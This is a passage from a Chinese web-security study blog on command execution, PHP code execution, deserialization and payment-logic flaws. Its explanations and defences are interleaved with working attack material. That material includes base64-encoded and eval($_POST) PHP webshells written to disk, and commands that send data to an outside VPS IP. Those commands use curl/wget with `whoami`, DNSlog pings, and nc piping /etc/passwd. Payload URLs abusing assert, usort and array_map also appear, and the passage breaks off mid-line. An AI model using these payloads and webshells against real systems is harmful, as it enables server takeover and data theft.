href="#1-有回显">¶</a>1.有回显</h4><p><strong>利用1：GetShell</strong></p><p>前提是对目标主机具有写入权限，其Linux主机可执行<code>pwd</code>获取绝对路径而Windows主机执行<code>chdir</code>获取绝对路径。</p><p><strong>linux主机</strong>通过echo将一句话木马写入php文件中或者可以将base64加密以后再解码写入eg：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt;shell.php<br></code></pre></td></tr></table></figure><p><strong>windows主机</strong>如果有写入权限和linux操作相同；</p><p>如果没有写入权限，就在VPS中开启http服务，利用wget或者curl下载木马文件写入出网的根目录。</p><p>eg：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget -o <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>nfo.php http:<span class="hljs-regexp">//</span>www.xx.com/phpinfo.txt<br>curl http:<span class="hljs-regexp">//</span>www.xx.com<span class="hljs-regexp">/phpinfo.txt &gt; /</span>var<span class="hljs-regexp">/www/</span>html/info.php<br></code></pre></td></tr></table></figure><p><strong>利用二：读取文件</strong></p><p>获取系统敏感信息…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Windows</span><br><span class="hljs-built_in">type</span> c:\windows\win.ini <br><span class="hljs-comment">#Linux</span><br><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h4 id="情景2：无回显"><a class="header-anchor" href="#情景2：无回显">¶</a>情景2：无回显</h4><ol><li><h5 id="DNS解析记录"><a class="header-anchor" href="#DNS解析记录">¶</a>DNS解析记录</h5></li></ol><blockquote><p>首先我们知道DNS是域名到IP地址的解析的服务，通过域名可以解析到对应的IP地址。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件…我们可以使目标主机访问DNSLog平台将我们执行的命令结果带到解析记录中.</p></blockquote><p><strong>linux主机</strong></p><p>利用前面的命令拼接符将想要执行的命令解析到DNS平台eg:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.ms1sct.dnslog.cn<br></code></pre></td></tr></table></figure><p><strong>windows主机</strong></p><p>使用dnslog平台结合<strong>系统变量</strong>来回显系统的一些数据信息</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ping</span> <span class="hljs-variable">%username%</span>.<span class="hljs-number">9</span>yw1y.dnslog.cn<br></code></pre></td></tr></table></figure><h6 id="附：windows系统变量"><a class="header-anchor" href="#附：windows系统变量">¶</a>附：windows系统变量</h6><img src="/posts/d62edc36/1685366000309-276662e8-346f-4353-ac78-bb379268fcf6.png" class title="image.png"><img src="/posts/d62edc36/1685366016258-ed5bb3ea-6e88-4bab-926e-9b5ac0d3adb7.png" class title="image.png"><p><strong>HTTP请求日志</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">VPS：<br>python -m http.server <span class="hljs-number">8080</span>    <span class="hljs-regexp">//</span>python3<br>python -m SimpleHTTPServer <span class="hljs-number">8080</span>      <span class="hljs-regexp">//</span>python2<br><br><br><br>漏洞处：<br> -使用 curl 命令：<br>ping -c <span class="hljs-number">4</span> || curl http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">118.221</span>:<span class="hljs-number">8080</span>/?`whoami`  <br> -使用 wget 命令：<br>ping -c <span class="hljs-number">4</span> || wget http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">118.221</span>:<span class="hljs-number">8080</span>/?`whoami`<br></code></pre></td></tr></table></figure><p><strong>NC传递执行结果</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># VPS上执行</span><br><span class="hljs-attribute">nc</span> -l <span class="hljs-number">8080</span><br><span class="hljs-comment"># 漏洞利用点执行</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">101.42.118.221</span> <span class="hljs-number">8080</span> &lt;/etc/passwd<br></code></pre></td></tr></table></figure><p><strong>反弹Shell</strong></p><p>反弹Shell应用场景</p><ol><li><p>命令执行处无法执行全部系统命令,常发生在Windows系统下(eg：dir/pwd/…)</p></li><li><p>获取交互式命令执行接口，方便与程序进行交互配置(eg:passwd username)</p></li><li><p>无法Powershell上线CS/无法一键部署挖矿程序情况下进行通信测试！</p></li></ol><h3 id="漏洞防护"><a class="header-anchor" href="#漏洞防护">¶</a>漏洞防护</h3><ol><li>不执行外部的应用程序或命令：</li></ol><p>○ 尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行 system、eval 等命令执行功能的函 数前，要确认参数内容。</p><ol start="2"><li>使用 <strong>escapeshellarg</strong> 函数处理相关参数：</li></ol><p>○ escapeshellarg 函数会将用户引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”， 双引号““”会被转义为“””，分号“;”会被转义为“;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。</p><ol start="3"><li>使用 <strong>safe_mode_exec_dir</strong> 执行可执行的文件路径 ：</li></ol><p>○ 将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir 指定的目录中才会允许执行，否则执行将失败。</p><h2 id="代码执行漏洞"><a class="header-anchor" href="#代码执行漏洞">¶</a>代码执行漏洞</h2><h3 id="原理-v7"><a class="header-anchor" href="#原理-v7">¶</a>原理</h3><p>​由于PHP程序未对前端用户提交的数据进行严格过滤或限制，从而导致传入的字段被带入到代码执行函数中作为参数执行，造成GetShell或接管服务器权限等高危害的Web漏洞！</p><blockquote><p>命令执行漏洞是执行的系统命令；即system()函数等调用命令解释器执行输入的命令；<br>代码执行漏洞是执行语言代码；即eval()函等将输入进的字符串交给PHP解释器当作PHP代码执行；</p></blockquote><h3 id="高危函数-v4"><a class="header-anchor" href="#高危函数-v4">¶</a>高危函数</h3><p><strong>1.eval函数</strong></p><p>mixed eval(string $code) 把字符串$code作为PHP代码执行。</p><p><strong>2.assert函数</strong></p><p>Bool assert(mixed $assertion[,string $description]) 检查一个断言是否为false（把字符串$assertion作为PHP代码执行）。</p><p><strong>3.preg_replace()函数</strong></p><p>mixed preg_replace (mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]]) 搜索subject中匹配pattern的部分， 以$replacement进行替换</p><blockquote><p>preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">eg:<br><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/abc/e&quot;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-string">&quot;abcd&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?cmd=<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure><p><strong>4.create_function()</strong></p><p>create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令</p><blockquote><p>create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</p></blockquote><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$func</span>();<br><span class="hljs-meta">?&gt;</span><br>-test.php?cmd=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p><strong>5. array_map()</strong></p><blockquote><p>array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p></blockquote><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$new_array</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p><strong>6.Call_user_func()/Call_user_func_array()</strong></p><p>call_user_func — 把第一个参数作为回调函数调用，其余参数是回调函数的参数。</p><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数。</p><p><strong>7.array_filter()</strong></p><p>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array1</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$func</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array1</span>,<span class="hljs-variable">$func</span>);<br><span class="hljs-meta">?&gt;</span><br>-test.php?func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p><strong>8.usort()/uasort()</strong></p><p>usort() 通过用户自定义的比较函数对数组进行排序。</p><p>uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。</p><blockquote><p>php环境&gt;=5.6才能用</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(...<span class="hljs-variable">$_GET</span>);<span class="hljs-meta">?&gt;</span><br>利用方式：<br>test.php?<span class="hljs-number">1</span>[]=<span class="hljs-number">1</span>-<span class="hljs-number">1</span>&amp;<span class="hljs-number">1</span>[]=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;x&#x27;</span>])&amp;<span class="hljs-number">2</span>=assert<br>[POST]:x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$_GET</span>,<span class="hljs-string">&#x27;asse&#x27;</span>.<span class="hljs-string">&#x27;rt&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>利用方式：<br>test.php?<span class="hljs-number">1</span>=<span class="hljs-number">1</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">2</span>=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x])<br>[POST]:x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p><strong>9.file_put_contents()/fputs()</strong></p><p>file_put_contents() 函数把一个字符串写入文件中。</p><p>fputs() 函数写入文件。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">访问直接写入：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&lt;?php eval($_POST[&#x27;</span>cmd<span class="hljs-string">&#x27;]);?&gt;&#x27;</span>;</span><br><span class="language-php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;test1.php&#x27;</span>,<span class="hljs-variable">$test</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[&#x27;</span>cmd<span class="hljs-string">&#x27;])?&gt;&#x27;</span>); </span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">参数写入：</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];</span><br><span class="language-php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">文件读取：</span><br><span class="language-xml">?cmd=var_dump(file_get_contents(&quot;c:\windows\win.ini&quot;));</span><br><span class="language-xml"></span><br><span class="language-xml">获取绝对路径：</span><br><span class="language-xml">?cmd=print(__FILE__);</span><br><span class="language-xml"></span><br><span class="language-xml">file_put_contents()函数写入一句话木马：(需知道绝对路径)</span><br><span class="language-xml">?cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">fputs()函数写入一句话木马：</span><br><span class="language-xml">    ?cmd=fputs(fopen(&quot;info.php&quot;,&quot;w&quot;),&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p><strong>10.动态函数</strong></p><p>PHP函数直接由字符串拼接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//函数名(形参)    </span><br><span class="hljs-meta">?&gt;</span><br>-test.php?a=assert&amp;b=<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure><h3 id="漏洞防护-v2"><a class="header-anchor" href="#漏洞防护-v2">¶</a>漏洞防护</h3><ol><li>使用 json 保存数组，当读取时就不需要使用 eval 了 ；</li><li>对于必须使用 eval 的地方，一定严格处理用户数据（白名单、黑名单）；</li><li>字符串使用单引号包括可控代码，插入前使用 addslashes 转义（addslashes、魔数引号、 htmlspecialchars、 htmlentities、mysql_real_escape_string） ；</li><li>放弃使用 preg_replace 的 e 修饰符，使用 preg_replace_callback()替换（preg_replace_callback()）；</li><li>若必须使用 preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象（preg_replace+正则） 。</li></ol><h3 id="问题-v7"><a class="header-anchor" href="#问题-v7">¶</a>问题</h3><p><strong>1.造成命令执行与代码执行漏洞的高危函数都有哪些?</strong></p><p><strong>2.命令/代码执行漏洞处无法GetShell思路如何？</strong></p><ul><li><p><strong>1.对写入的一句话木马做免杀操作，尝试写入</strong></p></li><li><p><strong>2.反弹Shell并执行文件下载在去GetShell</strong></p></li></ul><h1>反序列化漏洞-PHP</h1><h2 id="原理-v8"><a class="header-anchor" href="#原理-v8">¶</a>原理</h2><p>反序列化又叫对象注入，序列化在内部没有漏洞，漏洞产生是因为程序在处理对象、魔术函数以及序列化相关的问题导致的，当传给 unserialize()的参数可控时，那么用户就可以注入 payload，进行反序列化的时候就可能触发对象中的一些魔术方法。</p><h3 id="序列化"><a class="header-anchor" href="#序列化">¶</a>序列化</h3><p>序列化的目的是方便数据的传输和存储。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">string serialize ( mixed  <span class="hljs-variable">$value</span> )<br><span class="hljs-function"><span class="hljs-title">serialize</span><span class="hljs-params">()</span></span>  返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。 <br></code></pre></td></tr></table></figure><ol><li><p>字符串序列化</p></li><li><p>数组序列化</p></li><li><p>对象序列化</p></li></ol><p>O:4:“test”:1:{s:1:“a”;s:4:“test”;}</p><p>序列化格式介绍：O表示类 4表示类名长度 test是类名 1代表类中有一个属性 s 字符串 1 长度1位 a是属性名 test 是属性的值。</p><p><strong>含义与扩展</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"># 序列化字符含义<br>● a – <span class="hljs-built_in">array</span> 数组 <br>● b – <span class="hljs-built_in">bool</span>ean 布尔型 <br>● d – <span class="hljs-built_in">double</span> 双精度型 <br>● i – <span class="hljs-built_in">int</span>eger 整型 <br>● o – common object 一般对象 <br>● r – <span class="hljs-built_in">ref</span>erence   引用<br>● s – <span class="hljs-built_in">string</span> 字符串 <br>● C – custom object 自定义对象 <br>● O – <span class="hljs-keyword">class</span> <span class="hljs-symbol">N</span> – <span class="hljs-symbol">null</span> 表示类 <br>● <span class="hljs-symbol">R</span> – <span class="hljs-symbol">pointer</span> <span class="hljs-symbol">reference</span> 引用传递<br>● <span class="hljs-symbol">U</span> – <span class="hljs-symbol">unicode</span> <span class="hljs-symbol">string</span> <span class="hljs-symbol">unicode</span>编码的字符串  <br></code></pre></td></tr></table></figure><blockquote><p>private、public、protected是保留字，是成员访问限定符，其后必须跟冒号<br>（1）private：只能被本类中的成员函数访问，类外（除友元外）不能访问。<br>（2）public：公有成员可以被本类的成员函数访问，也能在类的作用域范围内的其他函数访问。<br>（3）protected：受保护成员可由本类的成员函数访问，也能由派生类的成员函数访问。</p></blockquote><h2 id="反序列化漏洞"><a class="header-anchor" href="#反序列化漏洞">¶</a>反序列化漏洞</h2><p>当程序在进行反序列化时，会自动调用一些函数，例如wakeup(),destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。</p><p><strong>魔术方法</strong></p><p>魔术方法：PHP中一般是以__开头，通常会因为某些条件而触发不用手动调用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs scss">●  <span class="hljs-built_in">__construct</span>() <br>当一个对象创建时被调用（ 构造函数，当对象创建(new)时会自动调用。 <span class="hljs-built_in">unserialize</span>()反序列化时是不会自动调用的。  ）； <br>● <span class="hljs-built_in">__destruct</span>() <br>当一个对象销毁前被调用 ；<br>● <span class="hljs-built_in">__sleep</span>() <br>在对象被序列化前被调用 （ 用于提交未提交的数据，或类似的清理操作  ）；<br>● __wakeup <br>将在反序列化之后立即被调用（当使用<span class="hljs-built_in">unserialize</span>()进行反序列话时，就会被调用， <span class="hljs-built_in">unserialize</span>()时会检查是否存在 <span class="hljs-built_in">__wakeup</span>()，如果存在，则会优先调用 <span class="hljs-built_in">__wakeup</span>()方法  ）；<br>● __toString <br>当一个对象被当做字符串使用时被调用 ；<br>● <span class="hljs-built_in">__get</span>(),<span class="hljs-built_in">__set</span>() <br>当调用或设置一个类及其父类方法中未定义的属性时 ；<br>● <span class="hljs-built_in">__invoke</span>() <br>调用函数的方式调用一个对象时的回应方法 ；<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 扩展魔术方法</span><br>（<span class="hljs-number">1</span>）__call：调用不可访问或不存在的方法时被调用<br>（<span class="hljs-number">2</span>）__callStatic：调用不可访问或不存在的静态方法时被调用<br>（<span class="hljs-number">3</span>）__clone：进行对象<span class="hljs-keyword">clone</span>时被调用<br>（<span class="hljs-number">4</span>）__isset：对不可访问或不存在的属性调用<span class="hljs-keyword">isset</span>()或<span class="hljs-keyword">empty</span>()被调用<br>（<span class="hljs-number">5</span>）__unset：对不可访问或不存在的属性进行<span class="hljs-keyword">unset</span>时被调用<br></code></pre></td></tr></table></figure><h3 id="条件-v2"><a class="header-anchor" href="#条件-v2">¶</a><strong>条件</strong></h3><ol><li>代码中有可利用的类，并且类中有wakeup()，sleep()，__destruct()这类特殊条件下可以自己调用的魔术方法。</li><li>unserialize()函数的参数可控。</li></ol><h3 id="防御"><a class="header-anchor" href="#防御">¶</a>防御</h3><p>（1）安全配置好php相关参数</p><p>通过Php配置文件里面有个disable_functions = 配置<br>这个禁止某些php函数，服务器便是用这个来禁止php的执行命令函数</p><p>禁止这些函数来执行系统命令</p><p>例：disable_functions =system,passthru,shell_exec，exec，popen</p><p>（2）严格控制传入变量，严谨使用魔法函数</p><h3 id="问题-v8"><a class="header-anchor" href="#问题-v8">¶</a>问题</h3><p>-1.什么是反序列化漏洞与原理？</p><p>-2.造成反序列化漏洞的高危函数与魔术方法?</p><p>-3.反序列化漏洞的修补方式？</p><h3 id="经典反序列化漏洞（待补充）"><a class="header-anchor" href="#经典反序列化漏洞（待补充）">¶</a>经典反序列化漏洞（待补充）</h3><h4 id="fastjson"><a class="header-anchor" href="#fastjson">¶</a>fastjson</h4><h1>业务逻辑漏洞</h1><img src="/posts/d62edc36/image-20230728161632099.png" class><h2 id="越权"><a class="header-anchor" href="#越权">¶</a>越权</h2><p><strong>水平越权</strong>：指攻击者尝试访问与他拥有相同权限的用户资源。</p><p><strong>垂直越权</strong>是一种 “基于URL的访问控制” 设计缺陷引起的漏洞，垂直越权可以分为两种，分别是向上越权和向下越权。</p><blockquote><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在 Cookie 中，并发送至客户端存储。攻击者通过修改 Cookie 中的身份标识为管理员，欺骗服务器分配管理员权限，达到垂直越权的目的</p></blockquote><h3 id="挖掘"><a class="header-anchor" href="#挖掘">¶</a>挖掘</h3><p><strong>越权挖掘位置</strong><br>● 个人资料的地址<br>● 下订单的地址<br>● 收获地址<br>● 越权评论商品<br>● 越权删除数据</p><p><strong>挖掘方法</strong><br>● get请求address_id参数<br>● post请求address_id参数<br>● cookie中的键值对</p><h3 id="防护-v3"><a class="header-anchor" href="#防护-v3">¶</a>防护</h3><ol><li>基础安全架构，完善用户权限体系。要知道哪些数据对于哪些用户，哪些数据不应该由哪些用户操作；</li><li>鉴权，服务端对请求的数据和当前用户身份做校验；</li><li>不要直接使用对象的实名或关键字；</li><li>对于可控参数进行严格的检查与过滤。</li></ol><h3 id="支付漏洞"><a class="header-anchor" href="#支付漏洞">¶</a>支付漏洞</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 修改支付状态</span><br>原理：如果支付状态的值未和实际订单支付状态进行校验，攻击者点击支付时抓包修改支付状态的参数为支付状态的值就能实现修改支付状态<br><br><span class="hljs-meta"># 修改购买数量</span><br>原理：抓包并修改商品的数量，如果修改数量后，总价格没有跟随数量的变化而变化；再者将数量修改为负数，如果总价格跟着变为负数。这二种可能都导致支付问题的产生<br><br><span class="hljs-meta"># 修改优惠券、积分</span><br>原理：根据优惠券的使用条件方式，尝试修改优惠劵金额、商品价格、折扣程度等<br><br><span class="hljs-meta"># 修改支付接口</span><br>原理：因为支付肯定会有提供很多支付平台供用户选择，每个支付接口的值肯定是不一样的，如果支付的逻辑存在漏洞，或者接口相关处理存在不足，此时对支付过程抓包，将支付接口修改为不存在的接口，等待平台的支付处理结果（一般不可能了）<br><br><span class="hljs-meta"># 交叉替换支付</span><br>原理：顾名思义，选择<span class="hljs-number">2</span>个不同商品，分别产生两个订单支付，对其都进行抓包，修改其订单一的值为订单二的值，如果平台没有验证商品相关信息和用户应支付价格，就可以尝试用订单二的支付价格去买到订单一的商品，因此产生了替换支付。<br><br><span class="hljs-meta"># 无限制试用</span><br>原理：试用类商品，如果产生多个订单并进行提交的校验，那么就可导致无限制刷牌子，每次提交的订单号不一样，相当于对同一个商品的多次试用的订单，如果存在逻辑漏洞的话，假设你全部申请退出试用，那么就会退相应数量的试用资格到你用户<br><br><span class="hljs-meta"># 最小支付额限制</span><br>原理：最小支付额是平台对支付价格的一个限制规则，当恶意修改支付价格后，如果支付价格小于最小支付额，会导致支付失败等问题（失败不代表不存在漏洞，可能是价格改的太小了）<br><br><span class="hljs-meta"># 最大值支付问题</span><br>原理：当支付值过大，超过逻辑处理规则（即存在支付逻辑漏洞），可将支付价格、优惠券等尝试修改为最大值，并观察支付结果的变化。<br><br><span class="hljs-meta"># 试用接口问题</span><br>原理：毋庸置疑，对于产品的试用，一个账户一般只能试用一次，如果接口<span class="hljs-number">1</span>是试用接口，接口<span class="hljs-number">2</span>是支付接口，如果抓包后将接口改为接口<span 